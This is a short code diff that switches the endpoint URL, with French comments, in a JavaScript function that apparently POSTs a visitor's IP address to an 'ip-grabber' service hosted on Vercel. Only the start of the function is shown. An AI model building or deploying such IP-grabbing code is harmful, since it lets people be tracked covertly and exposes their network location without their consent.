@@ -1,5 +1,5 @@
 function sendToBackend(ipAddress) {
-    const backendURL = 'https://ip-grabber-n2u0dmo6i-maxchat13s-projects.vercel.app/api/send-ip'; // Assure-toi de pointer vers /api/send-ip
+    const backendURL = 'https://ip-grabber-self.vercel.app/api/send-ip'; // URL complète de l'API
 
     const xhr = new XMLHttpRequest();
     xhr.open('POST', backendURL, true);
